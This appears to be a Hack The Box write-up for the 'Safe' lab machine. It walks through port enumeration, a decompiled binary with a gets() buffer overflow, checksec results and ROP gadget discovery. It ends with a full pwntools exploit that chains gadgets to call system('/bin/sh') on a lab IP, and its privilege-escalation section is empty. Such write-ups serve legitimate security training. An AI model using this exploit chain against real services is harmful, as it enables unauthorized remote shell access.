

# Safe Hack The Box


### Enumeration

We've found 3 ports
	- 22
	- 80
	- 1337

Enumerate the default page

```html
<html xmlns="http://www.w3.org/1999/xhtml">
<!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Debian Default Page: It works</title>
    <style type="text/css" media="screen">
  * {
```
### Intrusion

Defining the offset over the code decompiled

```c
int main(void)

{
  char greeter [112];
  
  system("/usr/bin/uptime");
  printf("\nWhat do you want me to echo back? ");
  gets(greeter);
  puts(greeter);
  return 0;
}

```

First at all, we need to determine what can we do over this binary file and of course determine if the buffer overflow is possible

```bash
gef➤  checksec
[+] checksec for '/home/arthur/Reversing/MachinesHTB/Review/Safe/content/myapp'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

the offset is 120 and the way to perform the exploitation is take control over the system library due to this one is executed in the main function and we need to get the test function that is no used in the code.

```out
**************************************************************
*                          FUNCTION                          *
**************************************************************
			undefined __stdcall test(void)
            undefined         AL:1           <RETURN>
                             test                                            XREF[3]:     Entry Point(*), 00402060, 
                                                                                          00402108(*)  
        00401152 55              PUSH       RBP
        00401153 48 89 e5        MOV        RBP,RSP
        00401156 48 89 e7        MOV        RDI,RSP
        00401159 41 ff e5        JMP        R13
        0040115c 90              ??         90h
        0040115d 5d              ??         5Dh    ]
        0040115e c3              ??         C3h

```
### Buffer Overflow

The python code for the exploitation:

```python
#!/usr/bin/python3

from pwn import *

context(terminal=["tmux", "new-window"])
context(os="linux", arch="amd64")
shell = remote("10.10.10.147", 1337)
offset = b'A'*112
cmd = b'/bin/sh\x00'

#   ❯ objdump -D myapp | grep system
#   0000000000401040 <system@plt>:
#   401040:       ff 25 da 2f 00 00       jmp    *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
#   40116e:       e8 cd fe ff ff          call   401040 <system@plt>

system = p64(0x401040)
test = p64(0x401152)

# just to send to r14 r15
null_byte = p64(0x0)

# ropper -f myapp --search "pop r13"
# 0x0000000000401206: pop r13; pop r14; pop r15; ret;
pop_13 = p64(0x401206)

exploit = offset + cmd + pop_13 + system + null_byte + null_byte + test

shell.sendline(exploit)
shell.interactive()

```


### Privilege Escalation

